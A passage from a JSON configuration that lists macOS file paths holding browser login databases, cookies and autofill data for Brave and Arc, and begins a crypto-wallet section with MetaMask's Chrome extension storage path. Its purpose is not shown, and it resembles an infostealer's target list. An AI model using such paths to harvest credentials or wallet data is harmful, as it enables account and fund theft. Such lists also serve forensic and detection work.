        "~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Web Data"
      ],
      "arc": [
        "~/Library/Application Support/Arc/User Data/Default/Login Data",
        "~/Library/Application Support/Arc/User Data/Default/Cookies",
        "~/Library/Application Support/Arc/User Data/Default/Web Data"
      ]
    },
    "crypto_wallets": {
      "metamask": [
        "~/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
